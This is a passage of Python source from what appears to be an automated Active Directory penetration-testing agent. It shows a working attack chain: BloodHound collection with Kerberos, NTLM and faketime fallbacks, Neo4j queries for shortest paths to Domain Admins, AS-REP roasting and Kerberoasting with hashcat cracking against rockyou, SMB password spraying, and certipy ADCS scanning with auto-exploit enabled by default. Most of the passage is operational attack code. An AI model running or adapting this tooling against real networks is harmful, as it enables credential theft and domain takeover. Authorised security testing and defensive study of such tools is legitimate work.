        # bloodhound-python uses -k (no --no-pass flag in older versions)
        os.environ["KRB5CCNAME"] = ccache
        os.environ["KRB5_CONFIG"] = krb5_conf
        cmd = (f"KRB5_CONFIG={shell_quote(krb5_conf)} KRB5CCNAME={shell_quote(ccache)} "
               f"{bh_env}{ftpfx}{bh_exec} "
               f"-u '{username}' -k -no-pass --auth-method kerberos "
               f"{common} 2>&1")
    elif nt_hash:
        cmd = (f"{bh_env}{bh_exec} -u '{username}' --hashes ':{nt_hash.split(':')[-1]}' "
               f"--auth-method auto {common} 2>&1")
    elif not password:
        return (
            "BloodHound collection skipped: no usable password, NT hash, or Kerberos ticket. "
            "Re-enter real credentials; redacted placeholders like *** are not accepted."
        )
    else:
        cmd = (f"{bh_env}{bh_exec} -u '{username}' -p '{password}' "
               f"--auth-method auto {common} 2>&1")
    out = _run(cmd, timeout=180)

    if _bh_auth_rejected(out):
        SESSION.setdefault("agent_intel", {})["last_bloodhound_auth_error"] = "invalid_credentials"
        if "kdc_err_preauth_failed" in out.lower() or "pre-authentication information was invalid" in out.lower():
            SESSION["use_kerberos"] = False
            SESSION["krb5_ccache"] = ""
            os.environ.pop("KRB5CCNAME", None)
        save_session()
        return (
            "BloodHound collection failed: credentials were rejected.\n"
            "KDC_ERR_PREAUTH_FAILED / LDAP data 52e means the username/password or hash is invalid for this domain.\n"
            f"Account tested: {username}@{domain}\n"
            "Fix the session credential, then rerun collect_bloodhound.\n\n"
            f"=== BloodHound output ===\n{_bh_failure_excerpt(out)}\n"
            "Zip files: []\n"
            "JSON files: []"
        )

    ipv6_selected = bool(re.search(r"Trying LDAP connection to\s+[0-9a-f:]{3,}", out, re.I))
    auth_failed = any(s in out.lower() for s in (
        "failure to authenticate with ldap", "acceptsecuritycontext error",
        "ldaperr:", "code: 49", "status_logon_failure", "invalidcredentials",
    ))
    if auth_failed and password and not (krb and ccache):
        if _bh_auth_rejected(out):
            SESSION.setdefault("agent_intel", {})["last_bloodhound_auth_error"] = "invalid_credentials"
            save_session()
            return (
                "BloodHound collection failed: LDAP rejected the credential.\n"
                "LDAP data 52e means invalid username or password.\n"
                f"Account tested: {username}@{domain}\n\n"
                f"=== BloodHound output ===\n{_bh_failure_excerpt(out)}\n"
                "Zip files: []\n"
                "JSON files: []"
            )
        retry_notes.append("BloodHound LDAP bind failed; requesting a Kerberos TGT and retrying with Kerberos.")
        new_ccache = _getTGT(username, password, domain, dc_ip)
        if new_ccache:
            SESSION["use_kerberos"] = True
            SESSION["krb5_ccache"] = new_ccache
            os.environ["KRB5CCNAME"] = new_ccache
            krb5_conf = _target_krb5_config(dc_ip, domain, dc_fqdn)
            krb, ccache = True, new_ccache
            new_ccache = _prefetch_ldap_tgs(domain, dc_ip, dc_fqdn) or new_ccache
            ftpfx = ftpfx or _faketime_prefix()
            retry_cmd = (f"KRB5_CONFIG={shell_quote(krb5_conf)} KRB5CCNAME={shell_quote(new_ccache)} "
                         f"{bh_env}{ftpfx}{bh_exec} "
                         f"-u '{username}' -k -no-pass --auth-method kerberos "
                         f"{common} 2>&1")
            out2 = _run(retry_cmd, timeout=180)
            out = out[:1200] + "\n\n=== FALLBACK Kerberos ===\n" + out2
        else:
            SESSION["ntlm_disabled"] = True
            retry_notes.append("Kerberos TGT request failed; verify the password and DC clock/DNS mapping.")

    if ipv6_selected and (password or nt_hash):
        retry_notes.append(
            f"BloodHound resolved {dc_fqdn or domain} to IPv6. Retrying with DC IP over NTLM to force IPv4."
        )
        ipv4_dc_host = dc_fqdn or _dc_host_for_kerberos(domain, dc_ip)
        ip_dns_opts = f"-dc {ipv4_dc_host} -gc {ipv4_dc_host} -ns {dc_ip} --dns-tcp --dns-timeout 2 --disable-autogc"
        ip_common = f"-d {domain} {ip_dns_opts} -c DCOnly --zip -op {out_prefix}_ipv4"
        if nt_hash:
            retry_cmd = (f"{bh_env}{bh_exec} -u '{username}' --hashes ':{nt_hash.split(':')[-1]}' "
                         f"--auth-method ntlm {ip_common} 2>&1")
        elif password:
            retry_cmd = (f"{bh_env}{bh_exec} -u '{username}' -p '{password}' "
                         f"--auth-method ntlm {ip_common} 2>&1")
        else:
            retry_cmd = ""
        if retry_cmd:
            out2 = _run(retry_cmd, timeout=120)
            out = out[:1200] + "\n\n=== FALLBACK IPv4/NTLM DCOnly ===\n" + out2
            if any(s in out2.lower() for s in ("ntlm is not supported", "status_not_supported", "80090302")):
                SESSION["ntlm_disabled"] = True
                retry_notes.append(
                    "NTLM fallback also failed/disabled. Add the DC FQDN to /etc/hosts so Kerberos uses IPv4."
                )

    dns_failed = any(s in out for s in (
        "LifetimeTimeout", "DNS query name does not exist", "The DNS operation timed out",
        "dns.resolver", "Could not resolve", "No nameservers", "Failed to resolve LDAP server IP"
    ))
    if dns_failed:
        retry_notes.append("Primary BloodHound collection hit DNS resolution timeout; retrying DCOnly with strict DC/GC/NS overrides.")
        common_retry = f"-d {domain} {dns_opts} -c DCOnly --zip -op {out_prefix}_dconly"
        if krb and ccache:
            ftpfx = ftpfx or _faketime_prefix()
            retry_cmd = (f"KRB5_CONFIG={shell_quote(krb5_conf)} KRB5CCNAME={shell_quote(ccache)} "
                         f"{bh_env}{ftpfx}{bh_exec} "
                         f"-u '{username}' -k -no-pass --auth-method kerberos "
                         f"{common_retry} 2>&1")
        elif nt_hash:
            retry_cmd = (f"{bh_env}{bh_exec} -u '{username}' --hashes ':{nt_hash.split(':')[-1]}' "
                         f"--auth-method auto {common_retry} 2>&1")
        elif not password:
            retry_cmd = ""
        else:
            retry_cmd = (f"{bh_env}{bh_exec} -u '{username}' -p '{password}' "
                         f"--auth-method auto {common_retry} 2>&1")
        if retry_cmd:
            out2 = _run(retry_cmd, timeout=90)
            out = out[:1200] + "\n\n=== FALLBACK DCOnly ===\n" + out2

    bh_kerb_failed = any(s in out.lower() for s in (
        "kerberos auth to ldap failed", "no authentication methods left",
        "getkerberostgs", "kdc_err", "krb_ap_err",
    ))
    if bh_kerb_failed and password:
        retry_notes.append("BloodHound Kerberos LDAP auth failed; retrying DCOnly with password-backed Kerberos.")
        ntlm_common    = f"-d {domain} {dns_opts} -c DCOnly --zip -op {out_prefix}_ntlm"
        kerb_pw_common = f"-d {domain} {dns_opts} -c DCOnly --zip -op {out_prefix}_kerbpw"
        ftpfx = ftpfx or _faketime_prefix()

        # Core fix: bloodhound-python -p password makes its OWN impacket TGT
        # request internally, which is NOT wrapped by faketime and fails with
        # KRB_AP_ERR_SKEW on Kerberos-only DCs.  Instead, pre-obtain the TGT
        # via _getTGT() (which correctly uses faketime) and hand the ccache to
        # bloodhound so it never calls the KDC itself.
        _bh_retry_ccache = ""
        if password:
            _bh_retry_ccache = _getTGT(username, password, domain, dc_ip)
            if _bh_retry_ccache and _ccache_is_valid(_bh_retry_ccache, username, domain):
                _bh_krb5conf = _target_krb5_config(dc_ip, domain, dc_fqdn)
                _prefetch_ldap_tgs(domain, dc_ip, dc_fqdn)
                SESSION["krb5_ccache"] = _bh_retry_ccache
                SESSION["use_kerberos"] = True
                os.environ["KRB5CCNAME"] = _bh_retry_ccache
                ccache = _bh_retry_ccache
                krb5_conf = _bh_krb5conf
                retry_cmd = (
                    f"KRB5_CONFIG={shell_quote(_bh_krb5conf)} "
                    f"KRB5CCNAME={shell_quote(_bh_retry_ccache)} "
                    f"{bh_env}{ftpfx}{bh_exec} "
                    f"-u '{username}' -k -no-pass --auth-method kerberos "
                    f"{kerb_pw_common} 2>&1"
                )
                retry_notes.append("Pre-obtained TGT via impacket+faketime; retrying BloodHound with ccache.")
            else:
                # _getTGT failed → fall back to passing the password and hoping
                # faketime intercepts bloodhound-python's internal impacket call
                retry_cmd = (
                    f"KRB5_CONFIG={shell_quote(krb5_conf or _target_krb5_config(dc_ip, domain, dc_fqdn))} "
                    f"{bh_env}{ftpfx}{bh_exec} -u '{username}' -p '{password}' "
                    f"--auth-method kerberos {kerb_pw_common} 2>&1"
                )
                retry_notes.append("TGT pre-fetch failed; passing password directly to BloodHound.")

        out2 = _run(retry_cmd, timeout=120)
        out = out[:1200] + "\n\n=== FALLBACK Kerberos Password DCOnly ===\n" + out2

        protected_or_ntlm_off = krb or SESSION.get("ntlm_disabled") or any(s in out2.lower() for s in (
            "protected users", "ntlm is not supported", "status_not_supported", "80090302",
        ))
        if protected_or_ntlm_off:
            SESSION["ntlm_disabled"] = True
            retry_notes.append("Skipping NTLM BloodHound fallback because NTLM is disabled or the principal is Kerberos-only.")
        else:
            retry_notes.append("Password-backed Kerberos failed; retrying DCOnly with password/NTLM auth.")
            retry_cmd = (
                f"{bh_env}{bh_exec} -u '{username}' -p '{password}' "
                f"--auth-method ntlm {ntlm_common} 2>&1"
            )
            out3 = _run(retry_cmd, timeout=120)
            out = out[:1800] + "\n\n=== FALLBACK NTLM DCOnly ===\n" + out3

    if bh_kerb_failed and not any(Path(out_dir).glob("*.json")):
        retry_notes.append("Trying NetExec LDAP BloodHound collector with Kerberos cache.")
        nxc_auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
        nxc_target = dc_fqdn or _dc_host_for_kerberos(domain, dc_ip)
        nxc_bh = _nxc(
            f"ldap {shell_quote(nxc_target)} {nxc_auth} "
            f"--dns-server {shell_quote(dc_ip)} --dns-tcp --bloodhound -c DCOnly",
            timeout=180,
        )
        out = out[:1800] + "\n\n=== FALLBACK NetExec BloodHound DCOnly ===\n" + nxc_bh

    all_zips_now = [z for z in Path(out_dir).glob("*.zip") if z.stat().st_size > 100]
    all_jsons_now = list(Path(out_dir).glob("*.json"))
    if bh_kerb_failed and not (all_zips_now or all_jsons_now):
        retry_notes.append("BloodHound collectors failed; running inline ACL/gMSA fallback so the attack chain can continue.")
        acl_fallback = tool_acl_abuse_scan(dc_ip, domain, username, password=password)
        out = out[:1800] + "\n\n=== FALLBACK Inline ACL/gMSA Scan ===\n" + acl_fallback[:2200]

    # Copy to session output
    all_zips = [z for z in Path(out_dir).glob("*.zip") if z.stat().st_size > 100]
    all_jsons = list(Path(out_dir).glob("*.json"))
    collection_failed = not (all_zips or all_jsons) and any(s in out.lower() for s in (
        "traceback", "collectionexception", "failed to get kerberos tgt",
        "could not authenticate", "preauth_failed", "invalidcredentials",
    ))
    zips = [] if collection_failed else all_zips
    jsons = [] if collection_failed else all_jsons
    if zips:
        dest = Path(SESSION.get("output_dir") or str(OUTPUT_DIR)) / "bloodhound"
        dest.mkdir(exist_ok=True)
        for z in zips:
            shutil.copy(str(z), str(dest))
        add_finding("BloodHound Collected", "Info",
                    f"BloodHound data collected. Load into Neo4j for attack path analysis.",
                    "Review all DA attack paths in BloodHound")
    elif jsons:
        dest = Path(SESSION.get("output_dir") or str(OUTPUT_DIR)) / "bloodhound"
        dest.mkdir(exist_ok=True)
        for j in jsons:
            shutil.copy(str(j), str(dest))
        add_finding("BloodHound JSON Collected", "Info",
                    "BloodHound JSON files collected without zip archive.",
                    "Import JSON files into BloodHound or zip them manually.")

    hint = (
        "\nOperator hint: if DNS still times out, add the DC to /etc/hosts and verify "
        f"`dig @{dc_ip} _ldap._tcp.pdc._msdcs.{domain} SRV +tcp`."
    ) if dns_failed and not zips and not jsons else ""
    if ipv6_selected and not zips and not jsons:
        host_hint = dc_fqdn or _dc_host_for_kerberos(domain, dc_ip)
        hint += (
            "\nOperator hint: BloodHound selected IPv6. Force IPv4 name resolution:\n"
            f"  echo \"{dc_ip} {host_hint} {domain}\" | sudo tee -a /etc/hosts\n"
            f"  getent ahostsv4 {host_hint}\n"
            "Then rerun BloodHound."
        )
    if bh_kerb_failed and not zips and not jsons:
        hint += (
            "\nAgent fallback: BloodHound legacy Kerberos failed after LDAP/GC TGS prefetch. "
            "Continue with acl_abuse_scan and gMSA/ACL enumeration instead of treating BloodHound as blocking."
        )
        SESSION.setdefault("agent_intel", {})["bloodhound_failed_nonblocking"] = True
    notes = ("\n".join(retry_notes) + "\n") if retry_notes else ""
    return (
        f"BloodHound collection:\n{notes}{out[:2500]}\n"
        f"Zip files: {[z.name for z in zips]}\n"
        f"JSON files: {[j.name for j in jsons]}{hint}"
    )


def _neo4j_reachable(uri: str = "bolt://localhost:7687", timeout: float = 2.0) -> bool:
    """Fast TCP check that a Neo4j bolt endpoint is listening — lets callers skip
    cypher-shell (and its JVM warnings + long connect errors) when the DB is down."""
    import socket
    m = re.search(r"//([^:/]+)(?::(\d+))?", uri or "")
    host = m.group(1) if m else "localhost"
    port = int(m.group(2)) if (m and m.group(2)) else 7687
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def _strip_jvm_noise(text: str) -> str:
    """Drop the harmless JVM/Jansi/Unsafe deprecation warnings cypher-shell prints
    to stderr so they don't drown the actual query output."""
    skip = ("WARNING:", "sun.misc.Unsafe", "native-access", "JansiLoader",
            "PlatformDependent", "enable-native-access", "Restricted method")
    return "\n".join(
        ln for ln in (text or "").splitlines()
        if not any(s in ln for s in skip)
    ).strip()


def tool_query_bloodhound_paths(domain: str, owned_user: str,
                                neo4j_uri: str = "bolt://localhost:7687",
                                neo4j_user: str = "neo4j",
                                neo4j_password: str = "") -> str:
    """Query imported BloodHound Neo4j data for paths from the owned principal."""
    cypher = shutil.which("cypher-shell")
    if not cypher:
        return (
            "cypher-shell not found. Import output/bloodhound/*.zip into BloodHound and "
            "use the GUI queries manually: Shortest Paths to Domain Admins and "
            "Outbound Object Control from the owned user."
        )

    # Preflight: skip cleanly when Neo4j is down instead of running 3 queries that
    # each spew JVM warnings + a connect error. The graph data is still collected
    # as JSON; this step is an optional enrichment.
    if not _neo4j_reachable(neo4j_uri):
        return (
            f"Neo4j not reachable at {neo4j_uri} — skipping BloodHound graph queries "
            f"(optional). Data is already collected in output/bloodhound/*.json. "
            f"To enable path analysis: start Neo4j (sudo neo4j start) and import the "
            f"JSON, then re-run query_bloodhound_paths."
        )

    dom = domain.upper()
    owned = owned_user.upper()
    if "@" not in owned:
        owned = f"{owned}@{dom}"
    da = f"DOMAIN ADMINS@{dom}"
    neo4j_password = (
        neo4j_password
        or os.environ.get("NEO4J_PASSWORD", "")
        or os.environ.get("BH_NEO4J_PASSWORD", "")
        or "bloodhound"
    )

    queries = {
        "Shortest path to Domain Admins": (
            f"MATCH p=shortestPath((u {{name:'{owned}'}})-[*1..8]->"
            f"(g:Group {{name:'{da}'}})) RETURN p LIMIT 5;"
        ),
        "Shortest path to high-value objects": (
            f"MATCH p=shortestPath((u {{name:'{owned}'}})-[*1..8]->"
            f"(h {{highvalue:true}})) RETURN p LIMIT 10;"
        ),
        "Outbound ACL/object-control edges": (
            f"MATCH p=(u {{name:'{owned}'}})-"
            f"[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AddMember|"
            f"ForceChangePassword|AllExtendedRights*1..2]->(n) RETURN p LIMIT 25;"
        ),
    }

    results = []
    for title, query in queries.items():
        cmd = (
            f"{shell_quote(cypher)} -a {shell_quote(neo4j_uri)} "
            f"-u {shell_quote(neo4j_user)} -p {shell_quote(neo4j_password)} "
            f"{shell_quote(query)} 2>&1"
        )
        out = _strip_jvm_noise(_run(cmd, timeout=45))
        results.append(f"=== {title} ===\n{out or 'No rows'}")

    combined = "\n\n".join(results)

    edge_re = re.compile(
        r'(GenericAll|GenericWrite|WriteDacl|WriteDACL|WriteOwner|Owns|AddMember|'
        r'ForceChangePassword|AllExtendedRights).*?([A-Za-z0-9_\-.$]+@?[A-Za-z0-9_.-]*)',
        re.I,
    )
    for right, target in edge_re.findall(combined):
        SESSION.setdefault("agent_intel", {}).setdefault("acl_paths", [])
        item = (right, target)
        if item not in SESSION["agent_intel"]["acl_paths"]:
            SESSION["agent_intel"]["acl_paths"].append(item)

    if "No rows" in combined:
        combined += (
            "\n\nOperator hint: if you just collected BloodHound data, import the zip from "
            "output/bloodhound/ into BloodHound first, then rerun query_bloodhound_paths."
        )
    return combined[:6000]


def _impacket_cmd(script: str, with_faketime: bool = False) -> str:
    """Return a system impacket command isolated from user-site packages.

    When with_faketime=True the env vars are prefixed with 'env' so faketime
    can exec them correctly.  Without it, the vars are bare shell assignments.

    Problem: `faketime "ts" PYTHONNOUSERSITE=1 python3 ...`
      → faketime sees "PYTHONNOUSERSITE=1" as the command → ENOENT
    Fix:     `faketime "ts" env PYTHONNOUSERSITE=1 python3 ...`
      → faketime execs env(1) which sets the vars and runs python3
    """
    env_vars = "PYTHONNOUSERSITE=1 PYTHONPATH=/usr/lib/python3/dist-packages"
    env_prefix = f"env {env_vars}" if with_faketime else env_vars
    example = f"/usr/share/doc/python3-impacket/examples/{script}.py"
    if Path(example).exists():
        return f"{env_prefix} /usr/bin/python3 {example}"
    local = os.path.expanduser(f"~/.local/bin/{script}.py")
    if Path(local).exists():
        return f"{env_prefix} /usr/bin/python3 {local}"
    return f"impacket-{script}"


def tool_asrep_roast(dc_ip: str, domain: str, username: str = "",
                     password: str = "", userlist: str = "") -> str:
    out_file = str(_runtime_path("agent_asrep.txt"))
    krb      = _session_kerberos_usable(username, domain)
    ntlm_off = SESSION.get("ntlm_disabled") or SESSION.get("agent_intel", {}).get("ntlm_disabled")
    dc_fqdn  = _dc_host_for_kerberos(domain, dc_ip)
    ft       = _faketime_prefix()
    get_np   = _impacket_cmd("GetNPUsers", with_faketime=bool(ft))
    if krb:
        ccache = SESSION["krb5_ccache"]
        os.environ["KRB5CCNAME"] = ccache
        cmd = (f"KRB5CCNAME={shell_quote(ccache)} {ft}{get_np} {domain}/{username} "
               f"-k -no-pass -dc-ip {dc_ip} -dc-host {dc_fqdn} "
               f"-request -format hashcat -outputfile {out_file}")
    elif ntlm_off and not krb:
        # No-auth AS-REP roast — works without credentials using a user list
        ufile = userlist or "/tmp/users.txt"
        if not Path(ufile).exists():
            return ("AS-REP roast skipped: NTLM disabled, no Kerberos ticket, and no user list. "
                    "Run kerbrute_enum first to discover usernames.")
        cmd = (f"{get_np} {domain}/ -dc-ip {dc_ip} "
               f"-no-pass -usersfile {ufile} -format hashcat -outputfile {out_file}")
    elif username:
        cmd = (f"{get_np} {domain}/{username}:'{password}' "
               f"-dc-ip {dc_ip} -dc-host {dc_fqdn} "
               f"-request -format hashcat -outputfile {out_file}")
    else:
        ufile = userlist or "/tmp/users.txt"
        if not Path(ufile).exists():
            _runtime_path("agent_loot").mkdir(exist_ok=True)
            Path(ufile).write_text(username or "administrator\nguest")
        cmd = (f"{get_np} {domain}/ -dc-ip {dc_ip} "
               f"-no-pass -usersfile {ufile} -format hashcat -outputfile {out_file}")
    out = _run(cmd, timeout=60)
    hashes = []
    if Path(out_file).exists():
        hashes = [l for l in Path(out_file).read_text().splitlines()
                  if l.startswith("$krb5asrep")]
        if hashes:
            cracked_file = _runtime_path("agent_asrep_cracked.txt")
            crack = _run(f"hashcat -m 18200 {shell_quote(out_file)} /usr/share/wordlists/rockyou.txt "
                        f"--force -o {shell_quote(str(cracked_file))} -q 2>/dev/null", timeout=120)
            cracked = ""
            if cracked_file.exists():
                cracked = cracked_file.read_text()
            add_finding("AS-REP Roastable Users", "High",
                        f"{len(hashes)} accounts without Kerberos pre-auth",
                        "Enable Kerberos pre-authentication for all accounts")
            return f"AS-REP hashes ({len(hashes)}):\n{chr(10).join(hashes[:5])}\nCracked: {cracked[:500] or 'None yet'}"
    return f"AS-REP result:\n{out[:1000]}\nNo hashes found or all accounts require pre-auth."


def tool_kerberoast(dc_ip: str, domain: str, username: str,
                    password: str = "", nt_hash: str = "") -> str:
    password = _real_secret(password) or _real_secret(SESSION.get("password", ""))
    nt_hash = _real_nt_hash(nt_hash) or _real_nt_hash(SESSION.get("nt_hash", ""))
    out_file = str(_runtime_path("agent_kerberoast.txt"))
    ntlm_off = SESSION.get("ntlm_disabled") or SESSION.get("agent_intel", {}).get("ntlm_disabled")
    dc_fqdn = _dc_host_for_kerberos(domain, dc_ip)
    ft = _faketime_prefix()
    # Use with_faketime=True so env vars are passed via env(1), not as shell prefixes
    get_spns = _impacket_cmd("GetUserSPNs", with_faketime=bool(ft))

    def _kerberos_cmd() -> str:
        ccache = SESSION["krb5_ccache"]
        os.environ["KRB5CCNAME"] = ccache
        return (f"KRB5CCNAME={shell_quote(ccache)} {ft}{get_spns} {domain}/{username} "
                f"-k -no-pass -dc-ip {dc_ip} -dc-host {dc_fqdn} "
                f"-request -outputfile {out_file}")

    def _password_cmd() -> str:
        return (f"env -u KRB5CCNAME {get_spns} {domain}/{username}:{shell_quote(password)} "
                f"-dc-ip {dc_ip} -dc-host {dc_fqdn} "
                f"-request -outputfile {out_file}")

    def _hash_cmd() -> str:
        return (f"env -u KRB5CCNAME {get_spns} {domain}/{username} "
                f"-hashes :{nt_hash.split(':')[-1]} -dc-ip {dc_ip} -dc-host {dc_fqdn} "
                f"-request -outputfile {out_file}")

    def _read_hashes() -> list:
        if not Path(out_file).exists():
            return []
        return [l for l in Path(out_file).read_text(errors="ignore").splitlines()
                if l.startswith("$krb5tgs")]

    def _format_success(hashes: list) -> str:
        cracked_file = _runtime_path("agent_krb_cracked.txt")
        _run(f"hashcat -m 13100 {shell_quote(out_file)} /usr/share/wordlists/rockyou.txt "
             f"--force -o {shell_quote(str(cracked_file))} -q 2>/dev/null", timeout=120)
        cracked = cracked_file.read_text(errors="ignore") if cracked_file.exists() else ""
        add_finding("Kerberoastable Accounts", "High",
                    f"{len(hashes)} service accounts with SPNs",
                    "Use gMSA; set 25+ char passwords on service accounts")
        return f"Kerberoast hashes ({len(hashes)}):\n{chr(10).join(hashes[:3])}\nCracked: {cracked[:500] or 'None yet'}"

    krb = _session_kerberos_usable(username, domain)
    if krb:
        cmd = _kerberos_cmd()
    elif nt_hash:
        cmd = _hash_cmd()
    elif password and not ntlm_off:
        # Keep the older password-auth Kerberoast path; it often succeeds before
        # a Kerberos-only pivot is needed and preserves hash output for cracking.
        cmd = _password_cmd()
    elif ntlm_off:
        return ("Kerberoast skipped: NTLM is disabled and no Kerberos ticket available. "
                "Run request_tgt first.")
    else:
        return "Kerberoast skipped: no password/hash or usable Kerberos ticket available."

    out = _run(cmd, timeout=60)
    hashes = _read_hashes()
    if hashes:
        return _format_success(hashes)

    if (("KRB_AP_ERR_SKEW" in out or "Clock skew too great" in out)
            and password):
        repair = tool_request_tgt(dc_ip, domain, username, password, nt_hash)
        if _session_kerberos_usable(username, domain):
            retry_out = _run(_kerberos_cmd(), timeout=60)
            hashes = _read_hashes()
            if hashes:
                return _format_success(hashes)
            return (f"Kerberoast result after clock-skew repair:\n"
                    f"{out[:700]}\n\n=== request_tgt repair ===\n{repair[:700]}\n\n"
                    f"=== Kerberos retry ===\n{retry_out[:1000]}\nNo SPN hashes captured.")
        return (f"Kerberoast hit clock skew and TGT repair failed:\n"
                f"{out[:700]}\n\n=== request_tgt repair ===\n{repair[:1000]}")

    # If Kerberos mode produced no hash but NTLM/password auth is still available,
    # fall back to the legacy path that was successful in the older tree.
    if krb and not ntlm_off and (password or nt_hash):
        fallback_cmd = _hash_cmd() if nt_hash else _password_cmd()
        fallback_out = _run(fallback_cmd, timeout=60)
        hashes = _read_hashes()
        if hashes:
            return _format_success(hashes)
        return (f"Kerberoast result:\n{out[:700]}\n\n"
                f"=== Password/hash fallback ===\n{fallback_out[:1000]}\nNo SPN hashes captured.")

    return f"Kerberoast result:\n{out[:1000]}\nNo SPNs found."


def tool_password_spray(dc_ip: str, domain: str, password: str = "",
                        userlist: str = "auto", passwords: list = None) -> str:
    """Password spray with lockout policy awareness.
    ALWAYS reads the domain password policy first and respects the threshold.
    In OPSEC normal/stealth mode adds jitter between attempts."""
    # ── Lockout policy check FIRST — never spray more than threshold-2 attempts ─
    policy = _check_lockout_policy()
    threshold  = policy.get("threshold", 0)
    safe_count = policy.get("safe_count", 1)
    obs_window = policy.get("observation_window", 30)

    if threshold > 0:
        warn_msg = (
            f"Lockout policy: threshold={threshold}, "
            f"observation_window={obs_window}min. "
            f"Safe to spray {safe_count} password(s) per user."
        )
    else:
        warn_msg = "No lockout policy detected (threshold=0) — spray is safe"

    ufile = userlist if userlist != "auto" else "/tmp/users.txt"
    if not Path(ufile).exists():
        ufile = "/tmp/agent_loot/users.txt"
    if not Path(ufile).exists():
        return f"No user list found. Run kerbrute_enum first.\n{warn_msg}"

    pw_list = passwords if passwords else ([password] if password else [])
    if not pw_list:
        return "No passwords to spray"

    # In stealth/normal mode, cap attempts at safe_count to avoid lockout
    if OPSEC_MODE != "loud" and threshold > 0:
        pw_list = pw_list[:safe_count]

    results = [warn_msg]
    for i, pw in enumerate(pw_list):
        if i > 0:
            # Wait between spray rounds to respect observation window
            _opsec_sleep(base_seconds=5.0)

        out = _nxc(f"smb {dc_ip} -u {shell_quote(ufile)} -p '{pw}' -d {domain} "
                   f"--no-bruteforce --continue-on-success 2>/dev/null | grep '\\[+\\]'")
        if "[+]" in out:
            results.append(f"✅ PASSWORD '{pw}' WORKS:\n{out}")
            add_finding("Password Spray Success", "High",
                        f"Password '{pw}' valid for discovered accounts",
                        "Implement password complexity; enforce lockout policy; use MFA")
        else:
            results.append(f"❌ '{pw}' — no matches")

    return "\n".join(results)


def tool_adcs_scan(dc_ip: str, domain: str, username: str,
	                   password: str = "", nt_hash: str = "",
	                   auto_exploit: bool = True) -> str:
    password = _real_secret(password) or _real_secret(SESSION.get("password", ""))
    nt_hash = _real_nt_hash(nt_hash) or _real_nt_hash(SESSION.get("nt_hash", ""))

    def _certipy_auth_rejected(text: str) -> bool:
        lower = (text or "").lower()
        return any(s in lower for s in (
            "data 52e",
            "invalidcredentials",
            "invalid credentials",
            "ldap ntlm authentication failed",
            "kdc_err_preauth_failed",
            "pre-authentication information was invalid",
            "status_logon_failure",
        ))

    def _certipy_success(text: str) -> bool:
        return any(s in (text or "") for s in (
            "Certificate Authorities",
            "Certificate Templates",
            "ESC",
        ))

    # Build certipy auth — Kerberos or password/hash
    dc_fqdn = _dc_host_for_kerberos(domain, dc_ip)
    krb = _session_kerberos_usable(username, domain)
    ccache = SESSION.get("krb5_ccache", "")
    if krb and not _ccache_is_valid(ccache, username, domain):
        if password:
            retry_ccache = _getTGT(username, password, domain, dc_ip)
        else:
            retry_ccache = ""
        if retry_ccache and _ccache_is_valid(retry_ccache, username, domain):
            SESSION["krb5_ccache"] = retry_ccache
            SESSION["use_kerberos"] = True
            os.environ["KRB5CCNAME"] = retry_ccache
            ccache = retry_ccache
            krb = True
        else:
            SESSION["use_kerberos"] = False
            SESSION["krb5_ccache"] = ""
            os.environ.pop("KRB5CCNAME", None)
            krb = False
            ccache = ""

    krb5_conf = _target_krb5_config(dc_ip, domain, dc_fqdn) if krb else SESSION.get("krb5_config", "")
    if krb and ccache:
        _prefetch_ldap_tgs(domain, dc_ip, dc_fqdn)
        auth = f"-u '{username}@{domain}' -k -no-pass"
        os.environ["KRB5CCNAME"] = ccache
        if krb5_conf:
            os.environ["KRB5_CONFIG"] = krb5_conf
    elif nt_hash:
        auth = f"-u '{username}@{domain}' -hashes :{nt_hash.split(':')[-1]}"
    elif password:
        auth = f"-u '{username}@{domain}' -p '{password}'"
    else:
        SESSION.setdefault("agent_intel", {})["last_adcs_scan_used_kerberos"] = False
        SESSION.setdefault("agent_intel", {})["last_adcs_needs_retry_after_tgt"] = True
        save_session()
        return (
            "ADCS scan skipped: no valid Kerberos ccache, password, or NT hash is available.\n"
            f"Current user: {username}@{domain}\n"
            "Run Session Manager to set credentials or run request_tgt first."
        )
    SESSION.setdefault("agent_intel", {})["last_adcs_scan_used_kerberos"] = bool(krb and ccache)
    SESSION.setdefault("agent_intel", {})["last_adcs_needs_retry_after_tgt"] = False
    save_session()

    # certipy needs -target FQDN and -dc-host FQDN for Kerberos environments
    target_flags = (
        f"-dc-ip {dc_ip} -target {dc_fqdn} -target-ip {dc_ip} "
        f"-dc-host {dc_fqdn} -ns {dc_ip} -dns-tcp -timeout 10"
    )
    results = []

    # Ensure Kerberos SPN resolution works later for certipy/evil-winrm.
    try:
        hosts = Path("/etc/hosts").read_text()
        if dc_fqdn not in hosts:
            results.append(
                f"NOTE: Add hosts entry for Kerberos if not already present:\n"
                f"echo \"{dc_ip} {dc_fqdn} {domain}\" | sudo tee -a /etc/hosts"
            )
    except Exception:
        pass

    results.append(
        "Kerberos ADCS chain command pattern:\n"
        f"sudo ntpdate -u {dc_fqdn or dc_ip}\n"
        f"getTGT.py {domain}/{username}:'<password>' -dc-ip {dc_ip}\n"
        f"export KRB5CCNAME={username}.ccache\n"
        f"certipy find -u {username}@{domain} -k -no-pass -dc-ip {dc_ip} "
        f"-target {dc_fqdn} -dc-host {dc_fqdn} -vulnerable"
    )

    certipy_cmd = shell_quote(_bin("certipy"))
    env_prefix = "PYTHONWARNINGS=ignore "
    if krb and ccache:
        env_prefix += f"KRB5_CONFIG={shell_quote(krb5_conf)} KRB5CCNAME={shell_quote(ccache)} "
    scan_cmd = f"{env_prefix}{_faketime_prefix()}{certipy_cmd} find {auth} {target_flags} -vulnerable -stdout 2>&1"
    scan_out = _run(scan_cmd, timeout=90)

    if _certipy_auth_rejected(scan_out) and not krb:
        SESSION.setdefault("agent_intel", {})["last_adcs_auth_error"] = "invalid_credentials"
        save_session()
        return (
            "ADCS scan failed: credentials were rejected by LDAP/Certipy.\n"
            "Windows LDAP error data 52e means invalid username or password.\n"
            f"Account tested: {username}@{domain}\n"
            "Fix the session credential, then run adcs_scan again.\n\n"
            f"=== ADCS SCAN ===\n{scan_out[:1800]}"
        )

    kerb_bind_failed = any(s in scan_out.lower() for s in (
        "ldap kerberos authentication failed",
        "kerberos authentication failed",
        "acceptsecuritycontext error",
        "data 576",
    ))
    if kerb_bind_failed:
        if _certipy_auth_rejected(scan_out):
            SESSION["use_kerberos"] = False
            SESSION["krb5_ccache"] = ""
            os.environ.pop("KRB5CCNAME", None)
